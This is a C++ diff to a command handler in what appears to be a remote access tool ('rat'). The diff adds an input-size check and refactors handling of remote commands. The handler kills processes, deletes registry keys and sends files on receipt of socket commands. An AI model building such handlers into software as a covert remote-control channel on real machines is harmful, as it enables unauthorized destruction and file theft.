@@ -8,20 +8,22 @@ ClientCmd::ClientCmd()
     SetType(-1);
 }
 
-ClientCmd::ClientCmd(const TcpSocket& socket, const char* input)
+ClientCmd::ClientCmd(const TcpSocket& socket, const char* input, int size)
 {
-    HandleInput(input);
+    HandleInput(input, size);
     SetSocket(socket);
 }
 
-void ClientCmd::HandleInput(const char* input)
+void ClientCmd::HandleInput(const char* input, int size)
 {
     // Get address and port here in input;
 
     SetType(-1);
+    if (size <= 8){
+        return;
+    }
     if (int cmd_sz = *((int*)input); cmd_sz <= 8)
     {
-        SetType(-1);
         return;
     }
     if (int type = *((int *)(input + 4)); type == static_cast<int>(rat::Command::CommandType::kClientKillPid))
@@ -48,11 +50,6 @@ void ClientCmd::HandleInput(const char* input)
     }
 }
 
-void ClientCmd::SetSocket(unsigned long long socket)
-{
-    socket_.SetSocket(socket);
-}
-
 void ClientCmd::SetSocket(const TcpSocket& socket)
 {
     socket_ = socket;
@@ -66,7 +63,7 @@ bool ClientCmd::execute()
     }
     if (GetType() == static_cast<int>(rat::Command::CommandType::kClientKillPid))
     {
-        Process p(std::atoi(&GetArgument()[0]));
+        Process p(std::stoi(&GetArgument()[0]));
         return p.KillSelf();
     }
     else if (GetType() == static_cast<int>(rat::Command::CommandType::kClientKillProcessName))
@@ -74,19 +71,21 @@ bool ClientCmd::execute()
         Process p(GetArgument());
         return p.KillSelf();
     }
-    #ifdef _WIN32
     else if (GetType() == static_cast<int>(rat::Command::CommandType::kClientDeleteRegistry))
     {
-        std::string arg = GetArgument();
-        std::stringstream ss(arg);
-        std::string root_hkey_name;
-        std::string sub_key_name;
-        ss >> root_hkey_name;
-        std::getline(ss, sub_key_name);
-        Registry r(root_hkey_name, sub_key_name);
-        return r.DeleteSelf();
+        #ifdef _WIN32
+            std::string arg = GetArgument();
+            std::stringstream ss(arg);
+            std::string root_hkey_name;
+            std::string sub_key_name;
+            ss >> root_hkey_name;
+            std::getline(ss, sub_key_name);
+            Registry r(root_hkey_name, sub_key_name);
+            return r.DeleteSelf();
+        #else 
+            return false;
+        #endif
     }
-    #endif
     else if (GetType() == static_cast<int>(rat::Command::CommandType::kClientSendFile))
     {
         auto f = File(GetArgument());
